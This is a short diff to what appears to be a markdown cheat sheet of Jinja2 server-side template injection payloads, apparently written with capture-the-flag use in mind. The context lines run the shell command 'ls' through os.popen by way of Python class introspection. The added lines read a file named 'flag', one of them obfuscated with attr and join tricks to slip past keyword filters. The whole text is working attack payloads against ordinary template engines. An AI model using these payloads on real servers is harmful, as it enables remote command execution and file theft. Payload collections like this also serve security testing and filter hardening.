@@ -44,6 +44,8 @@ Method 2:
 {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
 {{''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']("ls").read()}}
 {{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+{{cycler.__init__.__globals__.__builtins__.open("flag").read()}}
+{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}
 ```
 
 ### Filter bypass
